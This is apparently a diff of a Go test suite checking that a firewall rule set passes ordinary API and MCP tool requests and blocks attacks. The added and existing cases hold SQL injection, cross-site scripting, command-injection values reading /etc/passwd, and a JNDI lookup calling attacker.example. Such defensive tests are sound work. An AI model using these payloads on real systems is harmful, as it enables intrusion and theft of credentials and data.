@@ -661,6 +661,8 @@ func TestTheTendrilsSetLetsItsClientThrough(t *testing.T) {
 				send(tdBody("PATCH", "/api/v1/spaces/"+g.id(), map[string]any{"name": title}), "")
 				send(tdGet("/api/v1/search"+tdQuery("q", title, "limit", "8")), "")
 				send(tdGet("/api/v1/spaces/"+g.id()+"/recall?"+url.Values{"title": {title}, "label": {title, "ai"}}.Encode()), "")
+				send(g.tool(false, "list_pages", map[string]any{"space_id": title, "limit": 50}), " (a space by name)")
+				send(g.tool(true, "search_pages", map[string]any{"query": "keys", "space_id": title}), " (a space by name)")
 			}
 			for _, text := range tdProse {
 				send(tdBody("PATCH", "/api/v1/tasks/"+g.id(), map[string]any{"notes": text, "version": 3}), "")
@@ -822,6 +824,8 @@ func TestTheTendrilsSetKeepsTheAttacks(t *testing.T) {
 		{0, g.tool(false, "update_page", map[string]any{"page_id": task, "version": 2, "body_append": "x' UNION SELECT password FROM users--"})},
 		{0, g.tool(true, "suggest_page", map[string]any{"space_id": space, "title": "x", "text": "Lost the keys; cat /etc/passwd"})},
 		{1, g.tool(true, "search_tasks", map[string]any{"query": "1' OR '1'='1' --"})},
+		{1, g.tool(false, "list_pages", map[string]any{"space_id": "x' UNION SELECT password FROM users--"})},
+		{1, g.tool(true, "create_page", map[string]any{"space_id": "<img src=x onerror=alert(1)>", "title": "x", "body": "x"})},
 		{1, g.mcp(true, "initialize", map[string]any{"protocolVersion": "2025-06-18", "clientInfo": map[string]any{"name": "<img src=x onerror=alert(1)>"}})},
 		{1, g.mcp(false, "notifications/cancelled", map[string]any{"requestId": 3, "reason": "${jndi:ldap://attacker.example/a}"})},
 		{1, tdBody("POST", api+"/ai/capture/jabber", map[string]any{"text": "Groceries, then <script>alert(1)</script>", "space_ids": []string{space}})},
@@ -906,7 +910,7 @@ func TestTheTendrilsSetKeepsTheAttacks(t *testing.T) {
 		// the id command, which CRS alone refuses from paranoia 3; a
 		// notification has none.
 		{3, g.tool(false, "get_task", map[string]any{"task_id": "a);(b"})},
-		{3, g.tool(true, "list_tasks", map[string]any{"space_id": "a);(b"})},
+		{3, g.tool(true, "list_tasks", map[string]any{"space_id": space, "parent_id": "a);(b"})},
 		{4, g.mcp(true, "notifications/cancelled", map[string]any{"requestId": "a);(b"})},
 		{1, g.tool(false, "move_task", map[string]any{"task_id": task, "parent_id": "1' OR '1'='1"})},
 		{3, g.tool(false, "search_tasks", map[string]any{"query": "milk", "kinds": []string{"task", "a);(b"}})},
